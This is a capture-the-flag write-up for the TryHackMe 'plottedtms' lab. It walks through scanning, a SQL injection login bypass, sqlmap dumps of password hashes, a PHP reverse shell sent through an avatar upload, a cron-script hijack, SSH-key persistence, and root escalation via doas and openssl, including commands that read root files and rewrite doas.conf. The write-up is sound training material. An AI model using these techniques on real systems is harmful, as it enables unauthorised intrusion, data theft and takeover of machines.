plottedtms
===
###### tags: `THM` `Easy` 
###### Link: https://tryhackme.com/room/plottedtms

# Recon

## Nmap
```bash
$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $ip -oG allPorts.txt
```
```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

### OS
TTL 63 --> Linux (Guessing)

### Detect services
```bash
$ nmap -sCV -p 22,80,445 $ip -oN targeted
```
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

* Ubuntu server
* 22: OpenSSH 8.2
* 80 and 445: Apache/2.4.41

### Well-known vulnerabilities
```bash
$ nmap -Pn -sV -v --script vuln -p 22,80,445 $ip
```
```
Nothing relevant
```
Port 22:

![a62933b55377eff5f919e6d0e16d393d.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/a62933b55377eff5f919e6d0e16d393d.png)

Port 80:

![fecd4c695af9bbcab8fad6de325f5064.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/fecd4c695af9bbcab8fad6de325f5064.png)

Port 445:

![2e5f0801ce144574e4a38b572b9d8015.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/2e5f0801ce144574e4a38b572b9d8015.png)

## Dirsearch | Gobuster
```bash
$ dirsearch -u http://$ip
```
```
Target: http://10.10.66.68/

[17:15:05] Starting: 
[17:15:07] 403 -  276B  - /.ht_wsr.txt
[17:15:07] 403 -  276B  - /.htaccess.bak1
[17:15:07] 403 -  276B  - /.htaccess.orig
[17:15:07] 403 -  276B  - /.htaccess.sample
[17:15:07] 403 -  276B  - /.htaccess.save
[17:15:07] 403 -  276B  - /.htaccess_extra
[17:15:07] 403 -  276B  - /.htaccess_orig
[17:15:07] 403 -  276B  - /.htaccess_sc
[17:15:07] 403 -  276B  - /.htaccessBAK
[17:15:07] 403 -  276B  - /.htaccessOLD
[17:15:07] 403 -  276B  - /.htaccessOLD2
[17:15:07] 403 -  276B  - /.html
[17:15:07] 403 -  276B  - /.htm
[17:15:08] 403 -  276B  - /.htpasswd_test
[17:15:08] 403 -  276B  - /.htpasswds
[17:15:08] 403 -  276B  - /.httr-oauth
[17:15:08] 403 -  276B  - /.php
[17:15:15] 301 -  310B  - /admin  ->  http://10.10.66.68/admin/
[17:15:15] 200 -  931B  - /admin/?/login
[17:15:15] 200 -  931B  - /admin/
[17:15:15] 403 -  276B  - /admin/.htaccess
[17:15:31] 200 -   11KB - /index.html
[17:15:38] 200 -   25B  - /passwd
[17:15:44] 403 -  276B  - /server-status
[17:15:44] 403 -  276B  - /server-status/

Task Completed
```

http://$ip/passwd

![92f3e2e789bb53ea270d0a839ec46e3f.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/92f3e2e789bb53ea270d0a839ec46e3f.png)

bm90IHRoaXMgZWFzeSA6RA== --> (base64) not this easy :D

http://$ip/admin/

![5f191573a37fd995fb6c9cebc41de6a0.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/5f191573a37fd995fb6c9cebc41de6a0.png)

I save this file, I'm not sure what it is:
```bash
cat id_rsa
```
```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```

The service in the **445** port is an **http server**, not a samba server. So let's see what are published:
```bash
$ dirsearch -u http://$ip:445
```
```
Target: http://10.10.66.68:445/

[17:27:01] Starting:
[17:27:03] 403 -  277B  - /.ht_wsr.txt
[17:27:04] 403 -  277B  - /.htaccess.bak1
[17:27:04] 403 -  277B  - /.htaccess.sample
[17:27:04] 403 -  277B  - /.htaccess.orig
[17:27:04] 403 -  277B  - /.htaccess.save
[17:27:04] 403 -  277B  - /.htaccess_extra
[17:27:04] 403 -  277B  - /.htaccess_orig
[17:27:04] 403 -  277B  - /.htaccess_sc
[17:27:04] 403 -  277B  - /.htaccessBAK
[17:27:04] 403 -  277B  - /.htaccessOLD
[17:27:04] 403 -  277B  - /.htaccessOLD2
[17:27:04] 403 -  277B  - /.htm
[17:27:04] 403 -  277B  - /.html
[17:27:04] 403 -  277B  - /.htpasswd_test
[17:27:04] 403 -  277B  - /.htpasswds
[17:27:04] 403 -  277B  - /.httr-oauth
[17:27:04] 403 -  277B  - /.php
[17:27:28] 200 -   11KB - /index.html
[17:27:32] 200 -   14KB - /management/
[17:27:32] 301 -  320B  - /management  ->  http://10.10.66.68:445/management/
[17:27:41] 403 -  277B  - /server-status
[17:27:41] 403 -  277B  - /server-status/
```

What are in the **management** path?
```bash
$ dirsearch -u http://$ip:445/management/
```
```
Target: http://10.10.66.68:445/management/

[17:28:48] Starting: 
[17:28:51] 403 -  277B  - /management/.ht_wsr.txt
[17:28:51] 403 -  277B  - /management/.htaccess.bak1
[17:28:51] 403 -  277B  - /management/.htaccess.sample
[17:28:51] 403 -  277B  - /management/.htaccess.orig
[17:28:51] 403 -  277B  - /management/.htaccess.save
[17:28:51] 403 -  277B  - /management/.htaccess_extra
[17:28:51] 403 -  277B  - /management/.htaccess_sc
[17:28:51] 403 -  277B  - /management/.htaccessBAK
[17:28:51] 403 -  277B  - /management/.htaccess_orig
[17:28:51] 403 -  277B  - /management/.htaccessOLD
[17:28:51] 403 -  277B  - /management/.htaccessOLD2
[17:28:51] 403 -  277B  - /management/.htm
[17:28:51] 403 -  277B  - /management/.html
[17:28:51] 403 -  277B  - /management/.htpasswd_test
[17:28:51] 403 -  277B  - /management/.httr-oauth
[17:28:51] 403 -  277B  - /management/.htpasswds
[17:28:52] 403 -  277B  - /management/.php
[17:28:54] 200 -  198B  - /management/404.html
[17:28:58] 200 -    2KB - /management/about.html
[17:28:59] 301 -  326B  - /management/admin  ->  http://10.10.66.68:445/management/admin/
[17:28:59] 403 -  277B  - /management/admin/.htaccess
[17:29:00] 200 -   22KB - /management/admin/
[17:29:00] 200 -   22KB - /management/admin/?/login
[17:29:00] 200 -    5KB - /management/admin/login.php
[17:29:00] 500 -   15B  - /management/admin/home.php
[17:29:01] 200 -   22KB - /management/admin/index.php
[17:29:06] 301 -  327B  - /management/assets  ->  http://10.10.66.68:445/management/assets/
[17:29:06] 200 -    1KB - /management/assets/
[17:29:08] 301 -  326B  - /management/build  ->  http://10.10.66.68:445/management/build/
[17:29:08] 200 -    1KB - /management/build/
[17:29:09] 301 -  328B  - /management/classes  ->  http://10.10.66.68:445/management/classes/
[17:29:09] 200 -    2KB - /management/classes/
[17:29:09] 200 -    0B  - /management/config.php
[17:29:11] 200 - 1003B  - /management/database/
[17:29:11] 301 -  329B  - /management/database  ->  http://10.10.66.68:445/management/database/
[17:29:12] 200 -    1KB - /management/dist/
[17:29:12] 301 -  325B  - /management/dist  ->  http://10.10.66.68:445/management/dist/
[17:29:15] 500 -  229B  - /management/home.php
[17:29:16] 200 -    1KB - /management/inc/
[17:29:16] 301 -  324B  - /management/inc  ->  http://10.10.66.68:445/management/inc/
[17:29:16] 200 -   14KB - /management/index.php
[17:29:16] 200 -   14KB - /management/index.php/login/
[17:29:18] 301 -  325B  - /management/libs  ->  http://10.10.66.68:445/management/libs/
[17:29:23] 301 -  326B  - /management/pages  ->  http://10.10.66.68:445/management/pages/
[17:29:23] 200 -    1KB - /management/pages/
[17:29:25] 301 -  328B  - /management/plugins  ->  http://10.10.66.68:445/management/plugins/
[17:29:25] 200 -   13KB - /management/plugins/
[17:29:33] 301 -  328B  - /management/uploads  ->  http://10.10.66.68:445/management/uploads/
[17:29:34] 200 -    2KB - /management/uploads/

Task Completed
```

http://10.10.66.68:445/management/admin/login.php (see "Web Autentication")

http://10.10.66.68:445/management/database/

![b313bbe794ce559f28cd6358ac404c66.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/b313bbe794ce559f28cd6358ac404c66.png)

http://10.10.66.68:445/management/classes/

![b669b4f20b088234f02a169ea618d7d8.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/b669b4f20b088234f02a169ea618d7d8.png)

http://10.10.66.68:445/management/inc/

![f0dee4c168cb90abbea0ea9628d8c39c.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/f0dee4c168cb90abbea0ea9628d8c39c.png)

http://10.10.66.68:445/management/pages/

![4e6b94e9a605f759765fa263c6ec454b.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/4e6b94e9a605f759765fa263c6ec454b.png)

# Explotation

## Web Autentication
http://10.10.66.68:445/management/admin/login.php

![e4a3bddd6273c55f2c6e921e9358cd97.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/e4a3bddd6273c55f2c6e921e9358cd97.png)

## SQLi

Bypass auth:

![712bf6c3ad2e2bc332b8013b8cd82931.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/712bf6c3ad2e2bc332b8013b8cd82931.png)

### sqlmap
```bash
$ sqlmap -r Documents/plottedtms/test.req --dbs
```
```
available databases [2]:
[*] information_schema
[*] tms_db
```

```bash
$ sqlmap -r Documents/plottedtms/test.req --tables -D tms_db
```
```
Database: tms_db
[7 tables]
+---------------+
| drivers_list  |
| drivers_meta  |
| offense_items |
| offense_list  |
| offenses      |
| system_info   |
| users         |
+---------------+
```

```bash
$ sqlmap -r test.req --columns -T users
```
```
Database: tms_db
Table: users
[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| id           | int          |
| last_login   | datetime     |
| lastname     | varchar(250) |
| password     | text         |
| type         | tinyint(1)   |
| username     | text         |
+--------------+--------------+
```

```bash
sqlmap -r test.req -tables -D tms_db -T users -C password -dump
```
```
Database: tms_db
Table: users
[2 entries]
+----------------------------------+
| password                         |
+----------------------------------+
| 1254737c076cf867dc53d60a0364f38e |
| 14d147dc0ba2fed434e7fd176dc87fdc |
+----------------------------------+
```

This information is the same that I can see in **http://10.10.66.68:445/management/database/traffic_offense_db.sql** but now is confimed.

![2db1633e9210ccc8b87768bc9a48f865.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/2db1633e9210ccc8b87768bc9a48f865.png)

Futhermore, looking for users from system:
```bash
sqlmap -r test.req --users --passwords
```
```
database management system users [1]:
[*] 'tms_user'@'localhost'
```

## Spawn a shell
After bypass the auth, I see in the portal that I can upload files to change the user avatar. I'm gonna try upload a php code:

It seems that we can upload whatever:

![a09085c8ce638a5787d81fa71309bcc4.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/a09085c8ce638a5787d81fa71309bcc4.png)

And it works:

![1c9a0eb5fdace910435fa4e49cb2f33e.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/1c9a0eb5fdace910435fa4e49cb2f33e.png)

So let's upload a reverse shell (I used https://www.revshells.com/):

![5204e92ddcb3134adbb5e7e290f73a68.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/5204e92ddcb3134adbb5e7e290f73a68.png)

![10b36063631078109150ccde56a2e1a4.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/10b36063631078109150ccde56a2e1a4.png)

# Post-explotation

## Linpeas

![57ff18aacb3b658825123a0a6f7347e4.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/57ff18aacb3b658825123a0a6f7347e4.png)

![6d4be16d70b031fb7b943be7a0e46d4d.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/6d4be16d70b031fb7b943be7a0e46d4d.png)

![c08836605cb87584e8e35138099ba922.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/c08836605cb87584e8e35138099ba922.png)

![26061e9a996191d835d72e5c790cdd40.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/26061e9a996191d835d72e5c790cdd40.png)

![b761f3f50a9a4711cdcc6a78605c487c.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/b761f3f50a9a4711cdcc6a78605c487c.png)

--> 2021-10-25 15:04:12,950 DEBUG root:39 start: subiquity/Identity/POST: {"realname": "ubuntu", "username": "ubuntu", "crypted_password": "$6$R2W/.hj7...

## User flag
Linpeas remark **backup.sh** as a script executed by a cron job. We can, at least, read it:

![45adfcc01d02301302621f99d3fa3cd4.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/45adfcc01d02301302621f99d3fa3cd4.png)

We may cheat this script in order to execute some code or copy something to the plot_admin user, but:
* the folder /var/www/html/management it doesn't exist and I can't create it due to permissions.
* I can't edit the PATH variable for plot_admin.
* There aren't wildcards.

Actually, it's easier than the previous techniques, because it seems that I can modify and delete the file due to the www-data permisions over the folder:

![6bd4ea5366f4cf60f6403e7d2a3cf3e8.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/6bd4ea5366f4cf60f6403e7d2a3cf3e8.png)

So I put a reverse shell overwriting the file and wait for the cron job:

![083fabb01707a858573905cc1f5a79b6.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/083fabb01707a858573905cc1f5a79b6.png)

With all permissions:
```bash
$ chmod 777 backup.sh
```
And then I see that the user executing this cronjob is **plot_admin**, so we can read the **user.txt** flag in its home.

![eef342a1bff0c647bf43b9fd42acdf76.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/eef342a1bff0c647bf43b9fd42acdf76.png)

In order to maintain **persistence** and improve the **shell**, I put my random public key in the .ssh/authored_keys and I connect to the server via ssh.

## Privilege escalation - root flag
I relaunch the linpeas.sh script. The most important discovery is:

![9a181be3c1b2e204eb7af551e09606ff.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/9a181be3c1b2e204eb7af551e09606ff.png)

So I can impersonate root with [doas](https://man.archlinux.org/man/doas.1.en) (similar to sudo) and the openssl binary.

I check the techniques to exploit this config in https://gtfobins.github.io/gtfobins/openssl/

The reverse shell doesn't work because we cannot execute /bin/sh or /bin/bash with doas, only openssl, so the session is from the plot_admin, not root.

So, the goal is to read the /root/root.txt, so I execute the following and I obtain the flag:

```bash
doas openssl enc -in "$LFILE"
```

For a **root shell**, I have to use the *File write* option of openssl to edit the doas.conf and add the **bash** command:

```
permit nopass plot_admin as root cmd openssl
permit nopass plot_admin as root cmd bash
```

![d4ed6d566eb470baeeb8f89d011ce8cf.png](https://raw.githubusercontent.com/mor88888888/writeups/main/plottedtms/_resources/d4ed6d566eb470baeeb8f89d011ce8cf.png)
